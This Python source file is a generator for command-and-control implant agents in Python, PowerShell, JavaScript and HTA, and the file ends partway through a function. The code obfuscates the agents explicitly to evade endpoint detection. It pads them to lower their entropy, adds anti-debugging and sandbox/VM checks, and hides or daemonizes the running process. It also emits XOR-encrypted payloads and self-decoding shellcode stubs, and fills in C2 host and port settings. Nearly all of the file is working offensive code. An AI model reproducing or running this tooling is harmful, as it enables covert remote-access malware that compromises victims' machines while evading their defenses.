#!/usr/bin/env python3
"""
Agent Generator - Creates agents for different platforms
"""

import os
import sys
import shutil
import random
import string
import hashlib
import struct
from pathlib import Path


class AgentGenerator:
    """Generates agents for multiple platforms"""

    def __init__(self, output_dir: str = "output"):
        self.output_dir = Path(output_dir)
        self.templates_dir = Path("templates")
        self.output_dir.mkdir(exist_ok=True)

    def random_string(self, length: int = 8) -> str:
        """Generate random string for obfuscation"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def random_var_name(self) -> str:
        """Generate realistic looking variable name"""
        prefixes = ['data', 'temp', 'buf', 'ctx', 'info', 'val', 'obj', 'result',
                    'handler', 'proc', 'mgr', 'svc', 'cfg', 'opt', 'ref', 'item']
        return random.choice(prefixes) + '_' + self.random_string(6)

    def generate_junk_code(self) -> str:
        """Generate realistic looking but unused code (no comments for OPSEC)"""
        var = self.random_var_name()
        junk_patterns = [
            f"def {self.random_var_name()}():\n    {var} = {random.randint(0, 1000)}\n    return {var}",
            f"{self.random_var_name()} = {random.randint(0, 1000)}",
            f"'''{self.random_string(20)}'''",
            f"{self.random_var_name()} = lambda x: x * {random.randint(1, 10)}",
        ]
        return random.choice(junk_patterns)

    def calculate_shannon_entropy(self, data: str) -> float:
        """Calculate Shannon entropy of data (EDR evasion metric)"""
        import math
        if not data:
            return 0.0

        entropy = 0.0
        byte_counts = {}

        for byte in data.encode():
            byte_counts[byte] = byte_counts.get(byte, 0) + 1

        data_len = len(data.encode())
        for count in byte_counts.values():
            probability = count / data_len
            entropy -= probability * math.log2(probability)

        return entropy

    def reduce_entropy(self, content: str) -> str:
        """Reduce Shannon entropy to evade EDR detection (EK47 technique)

        Normal code entropy: ~4.5-6.5
        Encrypted/obfuscated code: ~7.5-8.0
        Target: Keep below 7.0 to appear as normal code
        """
        current_entropy = self.calculate_shannon_entropy(content)

        # If entropy is acceptable, return as-is
        if current_entropy < 6.8:
            return content

        # Add low-entropy padding (common English words and code patterns)
        padding_words = [
            'data', 'result', 'value', 'info', 'config', 'option', 'param', 'item',
            'handler', 'manager', 'service', 'process', 'buffer', 'context', 'state',
            'import', 'return', 'class', 'function', 'method', 'object', 'string'
        ]

        # Add strategic low-entropy content
        padding_vars = []
        for _ in range(random.randint(10, 20)):
            var_name = random.choice(padding_words) + '_' + random.choice(padding_words)
            value = random.choice([
                f'"{random.choice(padding_words)}"',
                str(random.randint(0, 100)),
                'None',
                'True',
                'False'
            ])
            padding_vars.append(f'{var_name} = {value}')

        # Insert padding at the beginning
        lines = content.split('\n')
        insert_point = 5  # After shebang and initial code
        for padding in padding_vars:
            lines.insert(insert_point, padding)
            insert_point += 1

        content = '\n'.join(lines)

        # Verify entropy reduction
        new_entropy = self.calculate_shannon_entropy(content)
        print(f"[*] Entropy reduction: {current_entropy:.2f} -> {new_entropy:.2f}")

        return content

    def reduce_entropy_with_syntax(self, content: str, language: str) -> str:
        """Reduce Shannon entropy using language-appropriate padding statements"""
        current_entropy = self.calculate_shannon_entropy(content)

        if current_entropy < 6.8:
            return content

        padding_words = [
            'data', 'result', 'value', 'info', 'config', 'option', 'param', 'item',
            'handler', 'manager', 'service', 'process', 'buffer', 'context', 'state',
            'import', 'return', 'class', 'function', 'method', 'object', 'string'
        ]

        padding_vars = []
        for _ in range(random.randint(10, 20)):
            var_name = random.choice(padding_words) + '_' + random.choice(padding_words)
            val = random.choice(padding_words)

            if language == 'powershell':
                padding_vars.append(f'${var_name} = "{val}"')
            elif language == 'javascript':
                padding_vars.append(f'const {var_name} = "{val}";')
            elif language == 'vbscript':
                padding_vars.append(f'Dim {var_name} : {var_name} = "{val}"')

        lines = content.split('\n')
        insert_point = min(5, len(lines))
        for padding in padding_vars:
            lines.insert(insert_point, padding)
            insert_point += 1

        content = '\n'.join(lines)

        new_entropy = self.calculate_shannon_entropy(content)
        print(f"[*] Entropy reduction ({language}): {current_entropy:.2f} -> {new_entropy:.2f}")

        return content

    def strip_comments_and_docstrings(self, content: str) -> str:
        """Remove all comments and docstrings for OPSEC"""
        import re
        lines = content.split('\n')
        cleaned_lines = []
        in_multiline_string = False
        multiline_char = None

        for line in lines:
            stripped = line.lstrip()

            # Skip shebang
            if stripped.startswith('#!'):
                cleaned_lines.append(line)
                continue

            # Handle multiline strings (docstrings)
            if '"""' in stripped or "'''" in stripped:
                # Count quotes
                triple_double = stripped.count('"""')
                triple_single = stripped.count("'''")

                if triple_double > 0:
                    if triple_double % 2 == 1:
                        in_multiline_string = not in_multiline_string
                        multiline_char = '"'
                    # Skip docstring lines
                    if in_multiline_string or (triple_double >= 2 and not line.strip().startswith('"""')):
                        continue
                    if triple_double >= 2:
                        continue

                if triple_single > 0:
                    if triple_single % 2 == 1:
                        in_multiline_string = not in_multiline_string
                        multiline_char = "'"
                    if in_multiline_string or (triple_single >= 2 and not line.strip().startswith("'''")):
                        continue
                    if triple_single >= 2:
                        continue

            # Skip lines inside multiline strings
            if in_multiline_string:
                continue

            # Remove inline comments (but preserve strings with #)
            if '#' in line:
                # Simple approach: remove everything after # if not in a string
                # This is a basic implementation
                in_string = False
                string_char = None
                new_line = []
                for i, char in enumerate(line):
                    if char in ['"', "'"] and (i == 0 or line[i-1] != '\\'):
                        if not in_string:
                            in_string = True
                            string_char = char
                        elif char == string_char:
                            in_string = False
                            string_char = None
                    if char == '#' and not in_string:
                        break
                    new_line.append(char)
                line = ''.join(new_line).rstrip()

            if line.strip():  # Keep non-empty lines
                cleaned_lines.append(line)

        return '\n'.join(cleaned_lines)

    def obfuscate_strings(self, content: str) -> str:
        """Advanced polymorphic obfuscation with EDR evasion"""
        import re

        # Generate unique identifiers for this agent
        func_mappings = {
            'execute_command': self.random_var_name(),
            'get_metadata': self.random_var_name(),
            'simple_encrypt': self.random_var_name(),
            'simple_decrypt': self.random_var_name(),
            'connect_to_server': self.random_var_name(),
            'socks_proxy_handler': self.random_var_name(),
            'heartbeat': self.random_var_name(),
            'calculate_sleep_time': self.random_var_name(),
            'http_request': self.random_var_name(),
            'register_agent': self.random_var_name(),
            'checkin': self.random_var_name(),
            'send_results': self.random_var_name(),
            'process_commands': self.random_var_name(),
            'upgrade_to_websocket': self.random_var_name(),
        }

        # Build combined regex for function names (single pass)
        # Exclude matches inside string literals to avoid corrupting protocol type values
        # e.g. 'checkin' and 'heartbeat' must stay as string literals for the server protocol
        func_pattern = re.compile(r"(?<!['\"])\b(" + '|'.join(re.escape(k) for k in func_mappings) + r")\b(?!['\"])")
        content = func_pattern.sub(lambda m: func_mappings[m.group(0)], content)

        # Randomize variable names in key areas (combined into two passes)
        var_replacements = {
            'metadata': self.random_var_name(),
            'message': self.random_var_name(),
            'command': self.random_var_name(),
            'output': self.random_var_name(),
            'encrypted': self.random_var_name(),
            'decrypted': self.random_var_name(),
            'websocket': self.random_var_name(),
        }
        # Exclude matches inside string literals to preserve dict keys like 'command', 'output'
        # while still renaming all code-level variable references (args, subscripts, etc.)
        var_pattern = re.compile(r"(?<!['\"])\b(" + '|'.join(re.escape(k) for k in var_replacements) + r")\b(?!['\"])")
        content = var_pattern.sub(lambda m: var_replacements[m.group(1)], content)

        # Obfuscate import names (EDR evasion)
        import_aliases = {
            'websockets': self.random_var_name(),
            'subprocess': self.random_var_name(),
            'platform': self.random_var_name(),
            'getpass': self.random_var_name(),
        }
        for original, alias in import_aliases.items():
            # Replace 'import X' with 'import X as alias' (both top-level and local/indented)
            content = re.sub(rf'^(\s*)(import {original})\s*$', rf'\g<1>import {original} as {alias}', content, flags=re.MULTILINE)
            # Replace usages of the module name (e.g., platform.system())
            content = re.sub(rf'\b{original}\.', f'{alias}.', content)

        # Obfuscate string literals (EDR evasion)
        strings_to_obfuscate = [
            ('register', 'type'),
            ('checkin', 'type'),
            ('command', 'type'),
            ('response', 'type'),
            ('heartbeat', 'type'),
        ]

        for string_val, context in strings_to_obfuscate:
            if context == 'type':
                # Encode strings using different methods randomly
                encoding_type = random.choice(['base64', 'hex', 'reverse', 'xor'])

                if encoding_type == 'base64':
                    encoded = __import__('base64').b64encode(string_val.encode()).decode()
                    replacement = f"__import__('base64').b64decode('{encoded}').decode()"
                elif encoding_type == 'hex':
                    encoded = string_val.encode().hex()
                    replacement = f"bytes.fromhex('{encoded}').decode()"
                elif encoding_type == 'reverse':
                    reversed_str = string_val[::-1]
                    replacement = f"'{reversed_str}'[::-1]"
                elif encoding_type == 'xor':
                    key = random.randint(1, 255)
                    xored = ''.join([chr(ord(c) ^ key) for c in string_val])
                    encoded = __import__('base64').b64encode(xored.encode()).decode()
                    replacement = f"''.join([chr(ord(c)^{key}) for c in __import__('base64').b64decode('{encoded}').decode()])"

                # Replace 'register' strings with obfuscated version
                content = content.replace(f"'{string_val}'", replacement)

        # Insert junk code only at very safe module-level positions
        # To avoid breaking code structure, insert only after complete function definitions
        lines = content.split('\n')
        safe_positions = []

        # Find positions right before function definitions (def keyword at start of line)
        for i, line in enumerate(lines):
            if i > 20 and i < len(lines) - 20:
                # Only insert before 'async def' or 'def' at module level (no indent)
                if line.startswith('def ') or line.startswith('async def '):
                    safe_positions.append(i)

        # Insert minimal junk code
        num_insertions = min(2, len(safe_positions))
        if safe_positions and num_insertions > 0:
            insert_positions = random.sample(safe_positions, num_insertions)
            for pos in sorted(insert_positions, reverse=True):
                # Only insert simple variable assignments
                junk = f"{self.random_var_name()} = {random.randint(0, 1000)}"
                lines.insert(pos, junk)

        content = '\n'.join(lines)

        # Add anti-debugging checks (EDR evasion)
        check_func = self.random_var_name()
        anti_debug = f'''
def {check_func}():
    import sys as _sys_check
    if hasattr(_sys_check, 'gettrace') and _sys_check.gettrace() is not None:
        _sys_check.exit(1)
    return True

{check_func}()
'''
        # Insert near the top
        content = content.replace('#!/usr/bin/env python3', '#!/usr/bin/env python3\n' + anti_debug)

        # Add sandbox/VM detection (delay rather than exit to avoid killing agent on real VMs)
        env_func = self.random_var_name()
        delay_var = self.random_var_name()
        sandbox_check = f'''
def {env_func}():
    import os as _os_env
    import time as _time_env
    {delay_var} = 0
    try:
        cpu_count = _os_env.cpu_count() or 1
        if cpu_count < 2:
            {delay_var} += 30
    except Exception:
        pass
    try:
        known_procs = ['vmsrvc', 'vmusrvc', 'vboxtray', 'vmtoolsd', 'wireshark', 'procmon', 'x64dbg', 'ollydbg', 'ida']
        if hasattr(_os_env, 'popen'):
            ps_out = _os_env.popen('tasklist 2>nul || ps aux 2>/dev/null').read().lower()
            for proc in known_procs:
                if proc in ps_out:
                    {delay_var} += 15
                    break
    except Exception:
        pass
    if {delay_var} > 0:
        _time_env.sleep({delay_var})

{env_func}()
'''
        content = content.replace('#!/usr/bin/env python3', '#!/usr/bin/env python3\n' + sandbox_check)

        # Strip all comments and docstrings for OPSEC
        content = self.strip_comments_and_docstrings(content)

        # Apply entropy reduction (EK47 technique) to evade EDR
        content = self.reduce_entropy(content)

        return content

    def obfuscate_powershell(self, content: str) -> str:
        """Polymorphic obfuscation for PowerShell agents"""
        import re
        import base64

        # 1. Strip comments: block comments <# ... #> then line comments #
        content = re.sub(r'<#.*?#>', '', content, flags=re.DOTALL)
        cleaned_lines = []
        for line in content.split('\n'):
            in_string = False
            string_char = None
            new_line = []
            i = 0
            while i < len(line):
                ch = line[i]
                if ch in ('"', "'") and (i == 0 or line[i-1] != '`'):
                    if not in_string:
                        in_string = True
                        string_char = ch
                    elif ch == string_char:
                        in_string = False
                        string_char = None
                if ch == '#' and not in_string:
                    break
                new_line.append(ch)
                i += 1
            cleaned_lines.append(''.join(new_line).rstrip())
        content = '\n'.join(line for line in cleaned_lines if line.strip())

        # 2. String encode protocol strings with Base64
        ps_strings = ['register', 'command', 'response', 'heartbeat', 'checkin']
        for s in ps_strings:
            encoded = base64.b64encode(s.encode()).decode()
            replacement = f"([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{encoded}')))"
            content = content.replace(f'"{s}"', replacement)

        # 3. Function rename
        func_map = {
            'Invoke-XOREncryption': f'Invoke-{self.random_string(8)}',
            'Invoke-XORDecryption': f'Invoke-{self.random_string(8)}',
            'Get-SystemMetadata': f'Get-{self.random_string(8)}',
            'Invoke-Command': f'Invoke-{self.random_string(8)}',
            'Start-Agent': f'Start-{self.random_string(8)}',
        }
        for original, replacement in func_map.items():
            pattern = re.compile(r'(?<!\w)' + re.escape(original) + r'(?!\w)')
            content = pattern.sub(replacement, content)

        # 4. Variable rename (sorted by length desc to prevent partial replacement)
        var_map = {}
        ps_vars = [
            '$RECONNECT_DELAY', '$metadata', '$registerMsg', '$encrypted',
            '$decrypted', '$buffer', '$received', '$response', '$output',
            '$windowcode', '$uri', '$ws', '$ct', '$segment', '$task',
            '$bytes', '$hwnd'
        ]
        for v in ps_vars:
            var_map[v] = '$' + self.random_var_name()
        # Sort by length desc
        sorted_vars = sorted(var_map.items(), key=lambda x: len(x[0]), reverse=True)
        # Exclusions
        exclude_vars = {'$env:', '$PID', '$true', '$false', '$null'}
        for original, replacement in sorted_vars:
            # Use regex that won't match $env: prefix or other exclusions
            escaped = re.escape(original)
            pattern = re.compile(escaped + r'(?![a-zA-Z0-9_])')
            content = pattern.sub(replacement, content)

        # 5. Junk code before function declarations
        lines = content.split('\n')
        func_positions = [i for i, line in enumerate(lines) if line.strip().startswith('function ')]
        num_junk = min(random.randint(2, 3), len(func_positions))
        if func_positions and num_junk > 0:
            positions = random.sample(func_positions, num_junk)
            for pos in sorted(positions, reverse=True):
                junk_var = '$' + self.random_var_name()
                junk_type = random.choice([
                    f'{junk_var} = Get-Random -Minimum 0 -Maximum 1000',
                    f'{junk_var} = [System.DateTime]::Now.Ticks',
                    f'{junk_var} = [System.Environment]::TickCount',
                ])
                lines.insert(pos, junk_type)
        content = '\n'.join(lines)

        # 6. Entropy reduce
        content = self.reduce_entropy_with_syntax(content, 'powershell')

        return content

    def obfuscate_javascript(self, content: str) -> str:
        """Polymorphic obfuscation for JavaScript agents"""
        import re
        import base64

        # 1. Strip comments: block /* ... */ then line //
        content = re.sub(r'/\*.*?\*/', '', content, flags=re.DOTALL)
        cleaned_lines = []
        for line in content.split('\n'):
            in_string = False
            string_char = None
            new_line = []
            i = 0
            while i < len(line):
                ch = line[i]
                if ch in ("'", '"', '`') and (i == 0 or line[i-1] != '\\'):
                    if not in_string:
                        in_string = True
                        string_char = ch
                    elif ch == string_char:
                        in_string = False
                        string_char = None
                if i < len(line) - 1 and line[i] == '/' and line[i+1] == '/' and not in_string:
                    break
                new_line.append(ch)
                i += 1
            cleaned_lines.append(''.join(new_line).rstrip())
        content = '\n'.join(line for line in cleaned_lines if line.strip())

        # 2. String encode protocol strings with Buffer.from base64
        js_strings = ['register', 'command', 'response', 'heartbeat', 'checkin']
        for s in js_strings:
            encoded = base64.b64encode(s.encode()).decode()
            replacement = f"Buffer.from('{encoded}', 'base64').toString()"
            content = content.replace(f"'{s}'", replacement)

        # 3. Function rename
        func_map = {
            'simpleEncrypt': self.random_var_name(),
            'simpleDecrypt': self.random_var_name(),
            'getMetadata': self.random_var_name(),
            'executeCommand': self.random_var_name(),
            'connectToC2': self.random_var_name(),
        }
        for original, replacement in func_map.items():
            content = re.sub(r'\b' + re.escape(original) + r'\b', replacement, content)

        # 4. Variable rename (skip output/response - conflict with JSON property keys)
        js_vars = [
            'RECONNECT_DELAY', 'registerMsg', 'heartbeatInterval',
            'dataBuffer', 'encrypted', 'decrypted', 'uri'
        ]
        var_map = {}
        for v in js_vars:
            var_map[v] = self.random_var_name()
        sorted_vars = sorted(var_map.items(), key=lambda x: len(x[0]), reverse=True)
        for original, replacement in sorted_vars:
            content = re.sub(r'\b' + re.escape(original) + r'\b', replacement, content)

        # 5. Junk code before function/async function lines
        lines = content.split('\n')
        func_positions = [i for i, line in enumerate(lines)
                         if line.strip().startswith('function ') or line.strip().startswith('async function')]
        num_junk = min(random.randint(2, 3), len(func_positions))
        if func_positions and num_junk > 0:
            positions = random.sample(func_positions, num_junk)
            for pos in sorted(positions, reverse=True):
                junk_var = self.random_var_name()
                junk_type = random.choice([
                    f'const {junk_var} = Math.floor(Math.random() * 1000);',
                    f'const {junk_var} = Date.now() % 1000;',
                    f'const {junk_var} = process.pid || 0;',
                ])
                lines.insert(pos, junk_type)
        content = '\n'.join(lines)

        # 6. Entropy reduce
        content = self.reduce_entropy_with_syntax(content, 'javascript')

        return content

    def obfuscate_hta(self, content: str) -> str:
        """Polymorphic obfuscation for HTA (VBScript) agents"""
        import re
        import base64

        # 1. Extract VBScript block from HTML wrapper
        vbs_start_tag = '<script language="VBScript">'
        vbs_end_tag = '</script>'
        vbs_start = content.find(vbs_start_tag)
        vbs_end = content.find(vbs_end_tag, vbs_start)
        if vbs_start < 0 or vbs_end < 0:
            return content

        html_preamble = content[:vbs_start + len(vbs_start_tag)]
        vbs_code = content[vbs_start + len(vbs_start_tag):vbs_end]
        html_postamble = content[vbs_end:]

        # 2. Strip VBScript comments (single-quote outside strings)
        cleaned_lines = []
        for line in vbs_code.split('\n'):
            in_string = False
            new_line = []
            for ch in line:
                if ch == '"':
                    in_string = not in_string
                if ch == "'" and not in_string:
                    break
                new_line.append(ch)
            result = ''.join(new_line).rstrip()
            if result.strip():
                cleaned_lines.append(result)
        vbs_code = '\n'.join(cleaned_lines)

        # 3. Inject decoder function (Chr-based string reconstruction)
        decoder_name = 'Fn' + self.random_string(8)
        decoder_func = f'''
        Function {decoder_name}(s)
            Dim arr, i, result
            arr = Split(s, ",")
            result = ""
            For i = 0 To UBound(arr)
                result = result & Chr(CInt(arr(i)))
            Next
            {decoder_name} = result
        End Function
'''
        # Insert decoder at top of VBS block
        vbs_code = decoder_func + vbs_code

        # 4. String encode - convert string literals to Chr() decoder calls
        # Process longer strings first to avoid partial matches
        # Handle VBS triple-quote patterns: """string""" -> """" & Decoder("ords") & """"
        vbs_protocol_strings = [
            'registered', 'checkin_ack', 'register', 'command', 'response',
            'heartbeat', 'checkin', 'agent_id', 'metadata', 'hostname',
            'username', 'domain', 'type', 'output', 'kill'
        ]
        vbs_protocol_strings.sort(key=len, reverse=True)

        for s in vbs_protocol_strings:
            ords = ','.join(str(ord(c)) for c in s)
            # Triple-quote pattern: """string""" (VBS in HTA doubled quotes)
            triple_pattern = '"""' + s + '"""'
            triple_replacement = '"""" & ' + decoder_name + '("' + ords + '") & """"'
            vbs_code = vbs_code.replace(triple_pattern, triple_replacement)
            # Standalone double-quote pattern: "string"
            standalone_pattern = '"' + s + '"'
            standalone_replacement = decoder_name + '("' + ords + '")'
            vbs_code = vbs_code.replace(standalone_pattern, standalone_replacement)

        # 5. Function rename (case-insensitive, exclude Window_OnLoad)
        func_map = {
            'XOREncrypt': self.random_var_name(),
            'XORDecrypt': self.random_var_name(),
            'Base64Encode': self.random_var_name(),
            'Base64Decode': self.random_var_name(),
            'Stream_StringToBinary': self.random_var_name(),
            'Stream_BinaryToString': self.random_var_name(),
            'GetMetadata': self.random_var_name(),
            'ExecuteCommand': self.random_var_name(),
            'PollC2': self.random_var_name(),
            'HandleResponse': self.random_var_name(),
            decoder_name: self.random_var_name(),
        }
        # Rename decoder_name itself
        actual_decoder_new = func_map[decoder_name]
        for original, replacement in func_map.items():
            pattern = re.compile(r'\b' + re.escape(original) + r'\b', re.IGNORECASE)
            vbs_code = pattern.sub(replacement, vbs_code)

        # Fix setTimeout string reference: "PollC2" was already renamed in code,
        # but the string "PollC2" in window.setTimeout needs updating
        poll_new_name = func_map['PollC2']
        # The setTimeout uses a string reference like: window.setTimeout "PollC2", 5000
        # After function rename, the string literal "PollC2" won't have been caught by \b regex
        # because it's inside quotes. Check if original string still exists.
        vbs_code = vbs_code.replace('"PollC2"', f'"{poll_new_name}"')
        # Case-insensitive version
        vbs_code = re.sub(r'"PollC2"', f'"{poll_new_name}"', vbs_code, flags=re.IGNORECASE)

        # 6. Variable rename (case-insensitive, sorted by length desc)
        vbs_vars = [
            'g_AgentId', 'g_C2Url', 'wshNetwork', 'wshShell', 'oExec',
            'payload', 'encrypted', 'responseText', 'decrypted', 'jsonStr',
            'errOutput', 'resultPayload', 'encResult', 'oXML', 'oNode',
            'BinaryStream', 'idStart', 'idEnd', 'cmdStart', 'cmdEnd'
        ]
        var_map = {}
        for v in vbs_vars:
            var_map[v] = self.random_var_name()
        sorted_vars = sorted(var_map.items(), key=lambda x: len(x[0]), reverse=True)
        for original, replacement in sorted_vars:
            pattern = re.compile(r'\b' + re.escape(original) + r'\b', re.IGNORECASE)
            vbs_code = pattern.sub(replacement, vbs_code)

        # 7. Junk code before Function/Sub declarations
        lines = vbs_code.split('\n')
        func_positions = [i for i, line in enumerate(lines)
                         if line.strip().lower().startswith('function ') or line.strip().lower().startswith('sub ')]
        # Exclude the decoder function we just injected (first function)
        if func_positions:
            func_positions = func_positions[1:]
        num_junk = min(random.randint(2, 3), len(func_positions))
        if func_positions and num_junk > 0:
            positions = random.sample(func_positions, num_junk)
            for pos in sorted(positions, reverse=True):
                junk_var = self.random_var_name()
                junk_type = random.choice([
                    f'        Dim {junk_var} : {junk_var} = Int(Rnd * 1000)',
                    f'        Dim {junk_var} : {junk_var} = Timer',
                    f'        Dim {junk_var} : {junk_var} = Int(Rnd * 500) + 1',
                ])
                lines.insert(pos, junk_type)
        vbs_code = '\n'.join(lines)

        # 8. Reassemble HTML + obfuscated VBS
        content = html_preamble + vbs_code + html_postamble

        # 9. Entropy reduce
        content = self.reduce_entropy_with_syntax(content, 'vbscript')

        return content

    def generate_bin_payload(self, agent_path: str, payload_type: int) -> str:
        """Generate XOR-encrypted .bin payload for external packer consumption

        Binary format:
            [4 bytes]  Magic: 0x53 0x50 0x42 0x4E ("SPBN")
            [1 byte]   Type: 0x01=ps1, 0x02=js, 0x03=hta, 0x04=py
            [16 bytes] XOR key (os.urandom)
            [4 bytes]  Original length (LE uint32)
            [N bytes]  XOR-encrypted payload

        Args:
            agent_path: Path to the generated agent file
            payload_type: Type byte (0x01-0x04)

        Returns:
            Path to the generated .bin file
        """
        with open(agent_path, 'rb') as f:
            payload = f.read()

        xor_key = os.urandom(16)
        encrypted = bytes(b ^ xor_key[i % 16] for i, b in enumerate(payload))

        bin_path = agent_path + '.bin'
        with open(bin_path, 'wb') as f:
            f.write(b'\x53\x50\x42\x4E')                    # Magic: SPBN
            f.write(struct.pack('B', payload_type))           # Type byte
            f.write(xor_key)                                  # 16-byte XOR key
            f.write(struct.pack('<I', len(payload)))          # Original length (LE)
            f.write(encrypted)                                # XOR-encrypted payload

        return bin_path

    def generate_raw_shellcode_blob(self, agent_path: str, payload_type: int, arch: str = 'x64') -> str:
        """Generate self-decoding shellcode blob with inline XOR decoder stub

        Blob layout:
            [stub bytes] XOR decoder (position-independent, jumps over key/len after decode)
            [16 bytes]   XOR key
            [4 bytes]    Payload length (LE)
            [N bytes]    XOR-encrypted payload

        The stub uses call/pop to get RIP/EIP-relative addressing, then XOR-decodes
        the payload in-place. After decoding, execution falls through to the raw payload.

        Args:
            agent_path: Path to the generated agent file
            payload_type: Type byte (unused in blob, kept for API consistency)
            arch: Target architecture ('x64' or 'x86')

        Returns:
            Path to the generated .sc.bin file
        """
        with open(agent_path, 'rb') as f:
            payload = f.read()

        xor_key = os.urandom(16)
        encrypted = bytes(b ^ xor_key[i % 16] for i, b in enumerate(payload))
        payload_len = len(payload)

        if arch == 'x64':
            # x64 decoder stub (~30 bytes):
            # call $+5 / pop rsi (get RIP) / lea rsi, [rsi + offset_to_key]
            # mov ecx, [rsi+16] (payload length) / lea rdi, [rsi+20] (payload start)
            # xor loop: xor byte [rdi+rcx-1], byte [rsi + (rcx-1)%16] / dec rcx / jnz loop
            stub = bytearray([
                0xE8, 0x00, 0x00, 0x00, 0x00,              # call $+5
                0x5E,                                        # pop rsi (rsi = addr of pop)
                0x48, 0x83, 0xC6, 0x1E,                     # add rsi, 30 (offset to key data)
                0x8B, 0x4E, 0x10,                            # mov ecx, [rsi+16] (payload len)
                0x48, 0x8D, 0x7E, 0x14,                     # lea rdi, [rsi+20] (payload start)
                # XOR decode loop:
                0x89, 0xC8,                                  # mov eax, ecx
                0xFF, 0xC8,                                  # dec eax
                0x83, 0xE0, 0x0F,                            # and eax, 0x0F (key index)
                0x8A, 0x14, 0x06,                            # mov dl, [rsi+rax] (key byte)
                0x30, 0x54, 0x0F, 0xFF,                      # xor [rdi+rcx-1], dl
                0xE2, 0xF2,                                  # loop (dec ecx, jnz -14)
                # Fall through to payload via jmp
                0xEB, 0x14,                                  # jmp +20 (skip key+len, land on payload)
            ])
        else:
            # x86 decoder stub (~25 bytes):
            stub = bytearray([
                0xE8, 0x00, 0x00, 0x00, 0x00,              # call $+5
                0x5E,                                        # pop esi (esi = addr of pop)
                0x83, 0xC6, 0x19,                            # add esi, 25 (offset to key data)
                0x8B, 0x4E, 0x10,                            # mov ecx, [esi+16] (payload len)
                0x8D, 0x7E, 0x14,                            # lea edi, [esi+20] (payload start)
                # XOR decode loop:
                0x89, 0xC8,                                  # mov eax, ecx
                0x48,                                        # dec eax
                0x83, 0xE0, 0x0F,                            # and eax, 0x0F
                0x8A, 0x14, 0x06,                            # mov dl, [esi+eax]
                0x30, 0x54, 0x0F, 0xFF,                      # xor [edi+ecx-1], dl
                0xE2, 0xF4,                                  # loop -12
                0xEB, 0x14,                                  # jmp +20 (skip key+len)
            ])

        blob = bytearray(stub)
        blob.extend(xor_key)                                  # 16-byte XOR key
        blob.extend(struct.pack('<I', payload_len))           # Payload length
        blob.extend(encrypted)                                # XOR-encrypted payload

        sc_path = agent_path + '.sc.bin'
        with open(sc_path, 'wb') as f:
            f.write(bytes(blob))

        return sc_path

    def generate_unique_encryption_key(self) -> str:
        """Generate unique encryption key for each agent"""
        random_bytes = os.urandom(16)
        return hashlib.sha256(random_bytes).hexdigest()[:24]

    def get_os_specific_code(self, target_os: str) -> dict:
        """Generate OS-specific code snippets for agent customization

        Args:
            target_os: 'windows', 'linux', 'macos', or 'auto'

        Returns:
            dict with 'init', 'commands', 'persistence' code snippets
        """
        os_code = {'init': '', 'commands': '', 'persistence': ''}

        if target_os == 'windows':
            init_func = self.random_var_name()
            os_code['init'] = f'''
def {init_func}():
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        ctypes.windll.kernel32.SetErrorMode(0x0001 | 0x0002)
    except:
        pass

{init_func}()
'''

            cmd_func = self.random_var_name()
            os_code['commands'] = f'''
def {cmd_func}(cmd):
    if cmd.startswith('powershell '):
        import subprocess
        return subprocess.run(['powershell', '-c', cmd[11:]], capture_output=True, text=True).stdout
    elif cmd == 'getuid':
        import getpass
        return getpass.getuser()
    return None
'''

        elif target_os == 'linux':
            init_func = self.random_var_name()
            os_code['init'] = f'''
def {init_func}():
    try:
        import os
        import sys
        if os.fork() > 0:
            sys.exit(0)
        os.setsid()
        if os.fork() > 0:
            sys.exit(0)
        sys.stdout.flush()
        sys.stderr.flush()
        with open('/dev/null', 'r') as f:
            os.dup2(f.fileno(), sys.stdin.fileno())
        with open('/dev/null', 'a+') as f:
            os.dup2(f.fileno(), sys.stdout.fileno())
        with open('/dev/null', 'a+') as f:
            os.dup2(f.fileno(), sys.stderr.fileno())
    except:
        pass
'''

            cmd_func = self.random_var_name()
            os_code['commands'] = f'''
def {cmd_func}(cmd):
    if cmd == 'getuid':
        import os
        return str(os.getuid())
    elif cmd == 'shell':
        import os
        return os.environ.get('SHELL', '/bin/sh')
    return None
'''

        elif target_os == 'macos':
            init_func = self.random_var_name()
            os_code['init'] = f'''
def {init_func}():
    try:
        import os
        import sys
        if os.fork() > 0:
            sys.exit(0)
        os.setsid()
    except:
        pass
'''

            cmd_func = self.random_var_name()
            os_code['commands'] = f'''
def {cmd_func}(cmd):
    if cmd.startswith('osascript '):
        import subprocess
        return subprocess.run(['osascript', '-e', cmd[10:]], capture_output=True, text=True).stdout
    elif cmd == 'getuid':
        import os
        return str(os.getuid())
    return None
'''

        return os_code

    def generate_python_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
                              beacon_mode: bool = False, beacon_interval: int = 60, beacon_jitter: int = 0,
                              obfuscate: bool = True, unique_key: bool = True, target_os: str = 'auto',
                              transport: str = 'websocket') -> str:
        """Generate Python agent with polymorphic obfuscation and OS-specific features

        Args:
            unique_key: Generate unique encryption key per agent (default True)
            target_os: Target OS ('windows', 'linux', 'macos', or 'auto' for current platform)
            transport: Transport protocol ('websocket', 'http', 'https')
        """
        # Determine target OS
        if target_os == 'auto':
            if sys.platform == 'win32':
                target_os = 'windows'
            elif sys.platform == 'darwin':
                target_os = 'macos'
            else:
                target_os = 'linux'

        print(f"[*] Generating agent for {target_os.upper()} via {transport.upper()}")

        # Select template based on transport and mode
        if transport in ('http', 'https'):
            if beacon_mode:
                template_path = self.templates_dir / "agent_http_beacon_minimal.py"
            else:
                template_path = self.templates_dir / "agent_http_template.py"
        else:
            if beacon_mode:
                template_path = self.templates_dir / "agent_beacon_minimal.py"
            else:
                template_path = self.templates_dir / "agent_template.py"

        if not template_path.exists():
            raise FileNotFoundError(f"Template not found: {template_path}")

        with open(template_path, 'r') as f:
            content = f.read()

        # Generate unique key if requested
        if unique_key:
            encryption_key = self.generate_unique_encryption_key()
            if not hasattr(self, 'generated_keys'):
                self.generated_keys = []
            self.generated_keys.append(encryption_key)

        # Replace placeholders
        content = content.replace("{{C2_HOST}}", c2_host)
        content = content.replace("{{C2_PORT}}", str(c2_port))
        content = content.replace("{{ENCRYPTION_KEY}}", encryption_key)
        content = content.replace("{{BEACON_MODE}}", "True" if beacon_mode else "False")
        content = content.replace("{{BEACON_INTERVAL}}", str(beacon_interval))
        content = content.replace("{{BEACON_JITTER}}", str(beacon_jitter))

        # HTTP/HTTPS-specific placeholders
